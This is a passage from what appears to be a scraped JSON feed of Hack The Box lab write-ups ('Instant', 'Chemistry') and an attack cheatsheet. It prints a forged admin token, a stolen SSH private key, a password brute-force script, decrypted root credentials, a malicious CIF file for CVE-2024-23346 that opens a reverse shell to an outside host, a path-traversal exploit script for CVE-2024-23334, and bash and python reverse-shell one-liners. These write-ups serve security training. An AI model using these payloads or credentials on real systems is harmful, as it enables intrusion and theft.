eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYAUse this authentication in swagger requests to get admin and get a lfi in read log apiFirst we get /etc/passwd, so we get username of user account is shirohigeSecond, we get key ssh of shirohige by path ../.ssh/id_rsa so now we have a foothold in system-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEApbntlalmnZWcTVZ0skIN2+Ppqr4xjYgIrZyZzd9YtJGuv/w3GW8BnwQ1vzh3BDyxhL3WLA3jPnkbB8j4luRrOfHNjK8lGefOMYtY/T5hE0VeHv73uEOA/BoeaHdAGhQuAAsDj8Avy1yQMZDV31PHcGEDu/0dU9jGmhjXfS70gfebpII3js9OmKXQAFc2T5k/5xL+1MHnZBiQqKvjbphueqpy9gDadsiAvKtOA8I6hpDDLZalak9Rgi+BsFvBsnz244uCBY8juWZrzme8TG5Np6KIg1tdZ1cqRL7lNVMgo7AdwQCVrUhBxKvTEJmIzR/4o+/w9njJ3+WFuaMbBzOsNCAnXb1Mk0ak42gNLqcrYmupUepN1QuZPL7xAbDNYK2OCMxws3rFPHgjhbqWPSjBlC7kaBZFqbUOA57SZPqJY9+F0jttWqxLxr5rtL15JNaG+rDfkRmmMzbGryCRiwPc//AFOq8vzE9XjiXZ2P/jJ/EXahuaL9A2Zf9YMLabUgGDAAAFiKxBZXusQWV7AAAAB3NzaC1yc2EAAAGBAKW57ZWpZp2VnE1WdLJCDdvj6aq+MY2ICK2cmc3fWLSRrr/8NxlvAZ8ENb84dwQ8sYS91iwN4z55GwfI+JbkaznxzYyvJRnnzjGLWP0+YRNFXh7+97hDgPwaHmh3QBoULgALA4/AL8tckDGQ1d9Tx3BhA7v9HVPYxpoY130u9IH3m6SCN47PTpil0ABXNk+ZP+cS/tTB52QYkKir426YbnqqcvYA2nbIgLyrTgPCOoaQwy2WpWpPUYIvgbBbwbJ89uOLggWPI7lma85nvExuTaeiiINbXWdXKkS+5TVTIKOwHcEAla1IQcSr0xCZiM0f+KPv8PZ4yd/lhbmjGwczrDQgJ129TJNGpONoDS6nK2JrqVHqTdULmTy+8QGwzWCtjgjMcLN6xTx4I4W6lj0owZQu5GgWRam1DgOe0mT6iWPfhdI7bVqsS8a+a7S9eSTWhvqw35EZpjM2xq8gkYsD3P/wBTqvL8xPV44l2dj/4yfxF2obmi/QNmX/WDC2m1IBgwAAAAMBAAEAAAGARudITbq/S3aB+9icbtOx6D0XcNSUkM/9noGckCcZZY/aqwr2a+xBTk5XzGsVCHwLGxa5NfnvGoBn3ynNqYkqkwzv+1vHzNCPOEU9GoQAtmT8QtilFXHUEof+MIWsqDuv/pa3vF3mVORSUNJ9nmHStzLajShazs+1EKLGNynKtHxCW9zWdkQdhVOTrUGi2+VeILfQzSf0nq+f3HpGAMA4rESWkMeGsEFSSuYjp5oGviHbT3rfZJ9w6Pj4TILFWV769TnyxWhUHcnXoTX90Tf+rAZgSNJm0I0fplb0dotXxpvWtjTe9y1Vr6kD/aH2rqSHE1lbO6qBoAdiyycUAajZFbtHsvI5u2SqLvsJR5AhOkDZw2uO7XS0sE/0cadJY1PEq0+Q7X7WeAqY+juyXDwVDKbA0PzIq66Ynnwmu0d2iQkLHdxh/Wa5pfuEyreDqAwDjMz7oh0APgkznURGnF66jmdE7e9pSV1wiMpgsdJ3UIGm6d/cFwx8I4odzDh+1jRRAAAAwQCMDTZMyD8WuHpXgcsREvTFTGskIQOuY0NeJz3yOHuiGEdJu227BHP3Q0CRjjHC74fN18nB8V1c1FJ03Bj9KKJZAsX+nDFSTLxUOy7/T39Fy45/mzA1bjbgRfbhheclGqcOW2ZgpgCKgzGrFox3onf+N5Dl0Xc9FWdjQFcJi5KKpP/0RNsjoXzU2xVeHi4EGoO+6VW2patq2sblVtpErOwUa/cKVlTdoUmIyeqqtOHCv6QmtI3kylhahrQw0rcbkSgAAADBAOAK8JrksZjy4MJhHSsLq1bCQ6nSP+hJXXjlm0FYcC4jLHbDoYWSilg96D1n1kyALvWrNDH9m7RMtS5WzBM3FXzKCwZBxrcPuU0raNkO1haQlupCCGGI5adMLuvefvthMxYxoAPrppptXR+g4uimwp1oJcO5SSYSPxMLojS9gg++Jv8IuFHerxoTwr1eY8d3smeOBc62yz3tIYBwSe/L1nIY6nBT57DOOYCGGElC1cS7pOg/XaOh1bPMaJ4Hi3HUWwAAAMEAvV2Gzd98tSB92CSKct+eFqcX2se5UiJZn90GYFZoYuRerYOQjdGOOCJ4D/SkIpv0qqPQNulejh7DuHKiohmK8S59uMPMzgzQ4BRW0GHwDs1CAcoWDnh7yhGK6lZM3950r1A/RPwt9FcvWfEoQqwvCV37L7YJJ7rDWlTa06qHMRMP5VNy/4CNnMdXALx0OMVNNoY1wPTAb0x/Pgvm24KcQn/7WCms865is11BwYYPaig5F5Zo1rbhd6Uh7ofGRW/5AAAAEXNoaXJvaGlnZUBpbnN0YW50AQ==-----END OPENSSH PRIVATE KEY-----Privilege EscalationTo start, i upload linpeas.sh and run. Read the report, i find out that 2 file is suspicious including /var/lib/PackageKit/transactions.db and /opt/backups/Solar-PuTTY/sessions-backup.datFirst, download 2 file take a look to transactions.db, i can not find anything interestingSecond, in the sessions-backup.dat, search for decrypting the session encryption, i find a tools in github repoDownload and write a python file to brute force password in solar putty with rockyou dictionaryimport subprocessimport ospassdata = &quot;rockyou.txt&quot;session = &quot;sessions-backup.dat&quot;decrypt = &quot;SolarPuttyDecrypt.exe&quot;with open(passdata, &#39;rb&#39;) as f: for password in f: password = password.strip() print(f&quot;Trying: {password}&quot;) s = subprocess.run([decrypt, session, password], capture_output=True, text=True) if s.returncode == 0: os.system(f&quot;.\\{decrypt} .\\{session} {password}&quot;) print(password) breakSo we can get the password is estrella and data in session-backup.dat after decrypting is{ &quot;Sessions&quot;: [ { &quot;Id&quot;: &quot;066894ee-635c-4578-86d0-d36d4838115b&quot;, &quot;Ip&quot;: &quot;10.10.11.37&quot;, &quot;Port&quot;: 22, &quot;ConnectionType&quot;: 1, &quot;SessionName&quot;: &quot;Instant&quot;, &quot;Authentication&quot;: 0, &quot;CredentialsID&quot;: &quot;452ed919-530e-419b-b721-da76cbe8ed04&quot;, &quot;AuthenticateScript&quot;: &quot;00000000-0000-0000-0000-000000000000&quot;, &quot;LastTimeOpen&quot;: &quot;0001-01-01T00:00:00&quot;, &quot;OpenCounter&quot;: 1, &quot;SerialLine&quot;: null, &quot;Speed&quot;: 0, &quot;Color&quot;: &quot;#FF176998&quot;, &quot;TelnetConnectionWaitSeconds&quot;: 1, &quot;LoggingEnabled&quot;: false, &quot;RemoteDirectory&quot;: &quot;&quot; } ], &quot;Credentials&quot;: [ { &quot;Id&quot;: &quot;452ed919-530e-419b-b721-da76cbe8ed04&quot;, &quot;CredentialsName&quot;: &quot;instant-root&quot;, &quot;Username&quot;: &quot;root&quot;, &quot;Password&quot;: &quot;12**24nzC!r0c%q12&quot;, &quot;PrivateKeyPath&quot;: &quot;&quot;, &quot;Passphrase&quot;: &quot;&quot;, &quot;PrivateKeyContent&quot;: null } ], &quot;AuthScript&quot;: [], &quot;Groups&quot;: [], &quot;Tunnels&quot;: [], &quot;LogsFolderDestination&quot;: &quot;C:\\\\ProgramData\\\\SolarWinds\\\\Logs\\\\Solar-PuTTY\\\\SessionLogs&quot;}Now use credentials to get the rootWE ARE ROOT NOW !!Box RootedIf you find my articles interesting, you can buy me a coffee" }, { "title": "Hack The Box - Chemistry", "url": "/posts/HTB-Chemistry-Writeup/", "categories": "Hackthebox, Hackthebox-Linux, Hackthebox-Easy", "tags": "nmap, gobuster, crackstation, CVE-2024-23346, linpeas, CVE-2024-23334, OSCP", "date": "2024-10-22 09:03:00 +0530", "snippet": "ReconNmapThe first thing that I do is run nmap scan that show this results:(kali㉿kali)-[~/Desktop]└─$ nmap -sV -sC --min-rate=1000 -p- 10.10.11.38Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-21 10:25 EDTNmap scan report for 10.10.11.38Host is up (0.23s latency).Not shown: 65533 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)| 256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)|_ 256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)5000/tcp open upnp?| fingerprint-strings: | GetRequest: | HTTP/1.1 200 OK| Server: Werkzeug/3.0.3 Python/3.9.5| Date: Mon, 21 Oct 2024 14:27:18 GMT| Content-Type: text/html; charset=utf-8| Content-Length: 719| Vary: Cookie| Connection: close| &amp;lt;!DOCTYPE html&amp;gt;| &amp;lt;html lang=&quot;en&quot;&amp;gt;| &amp;lt;head&amp;gt;| &amp;lt;meta charset=&quot;UTF-8&quot;&amp;gt; | &amp;lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&amp;gt; | &amp;lt;title&amp;gt;Chemistry - Home&amp;lt;/title&amp;gt; | &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;/static/styles.css&quot;&amp;gt; | &amp;lt;/head&amp;gt; | &amp;lt;body&amp;gt; | &amp;lt;div class=&quot;container&quot;&amp;gt; | class=&quot;title&quot;&amp;gt;Chemistry CIF Analyzer&amp;lt;/h1&amp;gt; | &amp;lt;p&amp;gt;Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.&amp;lt;/p&amp;gt; | &amp;lt;div class=&quot;buttons&quot;&amp;gt; | &amp;lt;center&amp;gt;&amp;lt;a href=&quot;/login&quot; class=&quot;btn&quot;&amp;gt;Login&amp;lt;/a&amp;gt; | href=&quot;/register&quot; class=&quot;btn&quot;&amp;gt;Register&amp;lt;/a&amp;gt;&amp;lt;/center&amp;gt; | &amp;lt;/div&amp;gt; | &amp;lt;/div&amp;gt; | &amp;lt;/body&amp;gt; | RTSPRequest: | &amp;lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01//EN&quot; | &quot;http://www.w3.org/TR/html4/strict.dtd&quot;&amp;gt; | &amp;lt;html&amp;gt; | &amp;lt;head&amp;gt; | &amp;lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=utf-8&quot;&amp;gt; | &amp;lt;title&amp;gt;Error response&amp;lt;/title&amp;gt; | &amp;lt;/head&amp;gt; | &amp;lt;body&amp;gt; | &amp;lt;h1&amp;gt;Error response&amp;lt;/h1&amp;gt; | &amp;lt;p&amp;gt;Error code: 400&amp;lt;/p&amp;gt;| &amp;lt;p&amp;gt;Message: Bad request version (&#39;RTSP/1.0&#39;).&amp;lt;/p&amp;gt;| &amp;lt;p&amp;gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&amp;lt;/p&amp;gt;| &amp;lt;/body&amp;gt;|_ &amp;lt;/html&amp;gt;1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port5000-TCP:V=7.94SVN%I=7%D=10/21%Time=671664C4%P=x86_64-pc-linux-gnu%SF:r(GetRequest,38A,&quot;HTTP/1\\.1\\x20200\\x20OK\\r\\nServer:\\x20Werkzeug/3\\.0\\.3SF:\\x20Python/3\\.9\\.5\\r\\nDate:\\x20Mon,\\x2021\\x20Oct\\x202024\\x2014:27:18\\x2SF:0GMT\\r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:SF:\\x20719\\r\\nVary:\\x20Cookie\\r\\nConnection:\\x20close\\r\\n\\r\\n&amp;lt;!DOCTYPE\\x20SF:html&amp;gt;\\n&amp;lt;html\\x20lang=\\&quot;en\\&quot;&amp;gt;\\n&amp;lt;head&amp;gt;\\n\\x20\\x20\\x20\\x20&amp;lt;meta\\x20charset=SF:\\&quot;UTF-8\\&quot;&amp;gt;\\n\\x20\\x20\\x20\\x20&amp;lt;meta\\x20name=\\&quot;viewport\\&quot;\\x20content=\\&quot;widSF:th=device-width,\\x20initial-scale=1\\.0\\&quot;&amp;gt;\\n\\x20\\x20\\x20\\x20&amp;lt;title&amp;gt;ChemiSF:stry\\x20-\\x20Home&amp;lt;/title&amp;gt;\\n\\x20\\x20\\x20\\x20&amp;lt;link\\x20rel=\\&quot;stylesheet\\&quot;\\SF:x20href=\\&quot;/static/styles\\.css\\&quot;&amp;gt;\\n&amp;lt;/head&amp;gt;\\n&amp;lt;body&amp;gt;\\n\\x20\\x20\\x20\\x20\\n\\xSF:20\\x20\\x20\\x20\\x20\\x20\\n\\x20\\x20\\x20\\x20\\n\\x20\\x20\\x20\\x20&amp;lt;div\\x20classSF:=\\&quot;container\\&quot;&amp;gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&amp;lt;h1\\x20class=\\&quot;title\\&quot;SF:&amp;gt;Chemistry\\x20CIF\\x20Analyzer&amp;lt;/h1&amp;gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&amp;lt;p&amp;gt;SF:Welcome\\x20to\\x20the\\x20Chemistry\\x20CIF\\x20Analyzer\\.\\x20This\\x20tool\\SF:x20allows\\x20you\\x20to\\x20upload\\x20a\\x20CIF\\x20\\(Crystallographic\\x20ISF:nformation\\x20File\\)\\x20and\\x20analyze\\x20the\\x20structural\\x20data\\x20SF:contained\\x20within\\.&amp;lt;/p&amp;gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&amp;lt;div\\x20clasSF:s=\\&quot;buttons\\&quot;&amp;gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&amp;lt;centerSF:&amp;gt;&amp;lt;a\\x20href=\\&quot;/login\\&quot;\\x20class=\\&quot;btn\\&quot;&amp;gt;Login&amp;lt;/a&amp;gt;\\n\\x20\\x20\\x20\\x20\\x20SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20&amp;lt;a\\x20href=\\&quot;/register\\&quot;\\x20class=\\&quot;btn\\&quot;&amp;gt;RSF:egister&amp;lt;/a&amp;gt;&amp;lt;/center&amp;gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&amp;lt;/div&amp;gt;\\n\\x20\\x20\\SF:x20\\x20&amp;lt;/div&amp;gt;\\n&amp;lt;/body&amp;gt;\\n&amp;lt;&quot;)%r(RTSPRequest,1F4,&quot;&amp;lt;!DOCTYPE\\x20HTML\\x20PUBSF:LIC\\x20\\&quot;-//W3C//DTD\\x20HTML\\x204\\.01//EN\\&quot;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\xSF:20\\x20\\&quot;http://www\\.w3\\.org/TR/html4/strict\\.dtd\\&quot;&amp;gt;\\n&amp;lt;html&amp;gt;\\n\\x20\\x20\\xSF:20\\x20&amp;lt;head&amp;gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&amp;lt;meta\\x20http-equiv=\\&quot;ConSF:tent-Type\\&quot;\\x20content=\\&quot;text/html;charset=utf-8\\&quot;&amp;gt;\\n\\x20\\x20\\x20\\x20\\xSF:20\\x20\\x20\\x20&amp;lt;title&amp;gt;Error\\x20response&amp;lt;/title&amp;gt;\\n\\x20\\x20\\x20\\x20&amp;lt;/head&amp;gt;SF:\\n\\x20\\x20\\x20\\x20&amp;lt;body&amp;gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&amp;lt;h1&amp;gt;Error\\x20SF:response&amp;lt;/h1&amp;gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&amp;lt;p&amp;gt;Error\\x20code:\\x20400SF:&amp;lt;/p&amp;gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&amp;lt;p&amp;gt;Message:\\x20Bad\\x20request\\x20SF:version\\x20\\(&#39;RTSP/1\\.0&#39;\\)\\.&amp;lt;/p&amp;gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&amp;lt;p&amp;gt;ErSF:ror\\x20code\\x20explanation:\\x20HTTPStatus\\.BAD_REQUEST\\x20-\\x20Bad\\x20rSF:equest\\x20syntax\\x20or\\x20unsupported\\x20method\\.&amp;lt;/p&amp;gt;\\n\\x20\\x20\\x20\\x20SF:&amp;lt;/body&amp;gt;\\n&amp;lt;/html&amp;gt;\\n&quot;);Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 184.23 secondsFrom the nmap results, we can see that there is port 5000 which is a web service that running on the server and on port 22 is SSH.Website - TCP 5000First of all, we can add the IP to our /etc/host folder as chemistry.htb0xStarlight@kali$ sudo nano /etc/host10.10.11.38 chemistry.htbUpon visiting the site, it looks like upload file website with .cif format file.The website is asking to upload a .cif file. After researching, i find a CVE with file .cif upload with poc in github repoCracking CVE-2024-23346Now with this poc so i create a .cif file to get a reverse shell. I just copy example data from example file from lab and change the shell to send reverse shell, you should change the IP and port. by&quot;/bin/bash -c \\&#39;sh -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.9/1234 0&amp;gt;&amp;amp;1\\&#39;&quot;data_Example_cell_length_a 10.00000_cell_length_b 10.00000_cell_length_c 10.00000_cell_angle_alpha 90.00000_cell_angle_beta 90.00000_cell_angle_gamma 90.00000_symmetry_space_group_name_H-M &#39;P 1&#39;loop_ _atom_site_label _atom_site_fract_x _atom_site_fract_y _atom_site_fract_z _atom_site_occupancy H 0.00000 0.00000 0.00000 1 O 0.50000 0.50000 0.50000 1_space_group_magn.transform_BNS_Pp_abc &#39;a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+[&quot;__sub&quot; + &quot;classes__&quot;]) () if d.__name__ == &quot;BuiltinImporter&quot;][0].load_module (&quot;os&quot;).system (&quot;/bin/bash -c \\&#39;sh -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.9/1234 0&amp;gt;&amp;amp;1\\&#39;&quot;);0,0,0&#39;_space_group_magn.number_BNS 62.448_space_group_magn.name_BNS &quot;P n&#39; m a&#39; &quot;Now that we have vuln.cif, we can upload it and have reverse shell by listening with netcatnc -nvlp 1234We now have a reverse shellNow we check the user and specify that we must find the credentials of the user rosaCheck some files in the directory, we can see a file database.db is suspicious. Maybe we can find the credentials of the user in thereBy reading the database, we can find a table user has the credentials of all users with hash password and rosa is one of them.Use this hash password in crackstation, so we can find the password of rosa is unicorniosrosadosWe now have credentials of rosa and get user flag by using sshPrivilege EscalationTo start, i upload linpeas.sh and run. Read the report, i find out that Server: Python/3.9 aiohttp/3.9.1, and with researching, i find poc to exploit CVE-2024-23334 in github repoUpload the pocexploit.sh#!/bin/bashurl=&quot;http://localhost:8080&quot;string=&quot;../&quot;payload=&quot;/assets/&quot;file=&quot;root/root.txt&quot; # without the first /for ((i=0; i&amp;lt;15; i++)); do payload+=&quot;$string&quot; echo &quot;[+] Testing with $payload$file&quot; status_code=$(curl --path-as-is -s -o /dev/null -w &quot;%{http_code}&quot; &quot;$url$payload$file&quot;) echo -e &quot;\\tStatus code --&amp;gt; $status_code&quot; if [[ $status_code -eq 200 ]]; then curl -s --path-as-is &quot;$url$payload$file&quot; break fidoneRun poc and we can get the root flag. Also we can access to /root/.ssh/id_rsa to get ssh key of root.Connect and WE ARE ROOT !!Box RootedIf you find my articles interesting, you can buy me a coffee" }, { "title": "Cheatsheet", "url": "/posts/Cheatsheet/", "categories": "Cheatsheet", "tags": "nmap, gobuster, ffuf, jadx, linpeas, dnspy, zeek, OSCP", "date": "2024-10-22 09:00:00 +0530", "snippet": "ReconScanNmapnmap -sV -sC --min-rate=1000 -p- &amp;lt;IP&amp;gt; -o nmapGobusterDirsearchgobuster dir -w /usr/share/wordlists/dirb/common.txt -u &amp;lt;IP/DNS&amp;gt;Break status codegobuster dir -w /usr/share/wordlists/dirb/common.txt -u &amp;lt;IP/DNS&amp;gt; -b &amp;lt;BREAK_STATUSCODE&amp;gt;ffufSubdomain searchffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H “Host: FUZZ.site.com” -u http://site.comfscanScan host in networkShadow1ng/fscan (github.com)./fscan -h 172.0.0.1/24Zeek with pcapzeek -Cr 0.pcapHowever password in zeek is to config for zeek to show in [Ippsec-Cap](https://www.youtube.com/watch?v=O_z6o2xuvlw)SSH Port Forwardingssh -L &amp;lt;PORT IN LOCAL&amp;gt;:&amp;lt;IP&amp;gt;:&amp;lt;PORT IN SERVER&amp;gt; username@&amp;lt;IP SERVER&amp;gt;ExploitBash reverse shellbash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.14/9001 0&amp;gt;&amp;amp;1&#39;Python reverse shellpython -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.16.30&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#39;Stable reverse shellpython3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;GitHack - Exploit .gitlijiejie/GitHack: Khai thác tiết lộ thư mục .git (github.com)Githackpython GitHack.py http://site.htb/.git/Hash Identifierhash-identifier ┌──(kali㉿kali)-[~/TCM/TCM03_Academy]└─$ hash-identifier /usr/share/hash-identifier/hash-id.py:13: SyntaxWarning: invalid escape sequence &#39;\\ &#39; logo=&#39;&#39;&#39; ######################################################################### ######################################################################### # __ __ __ ______ _____ # # /\\ \\/\\ \\ /\\ \\ /\\__ _\\ /\\ _ `\\ # # \\ \\ \\_\\ \\ __ ____ \\ \\ \\___ \\/_/\\ \\/ \\ \\ \\/\\ \\ # # \\ \\ _ \\ /&#39;__`\\ / ,__\\ \\ \\ _ `\\ \\ \\ \\ \\ \\ \\ \\ \\ # # \\ \\ \\ \\ \\/\\ \\_\\ \\_/\\__, `\\ \\ \\ \\ \\ \\ \\_\\ \\__ \\ \\ \\_\\ \\ # # \\ \\_\\ \\_\\ \\___ \\_\\/\\____/ \\ \\_\\ \\_\\ /\\_____\\ \\ \\____/ # # \\/_/\\/_/\\/__/\\/_/\\/___/ \\/_/\\/_/ \\/_____/ \\/___/ v1.2 # # By Zion3R # # www.Blackploit.com # # Root@Blackploit.com # #########################################################################-------------------------------------------------- HASH:Privilege EscalationCheck sudo file permissionssudo -lTools linpeas pspy - https://github.com/DominicBreuker/pspy - Show all process run in linuxReverse shellbash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/8080 0&amp;gt;&amp;amp;1Reverse ToolsC# and .NET dnSpy Other Tools If you find my articles interesting, you can buy me a coffee" } ]
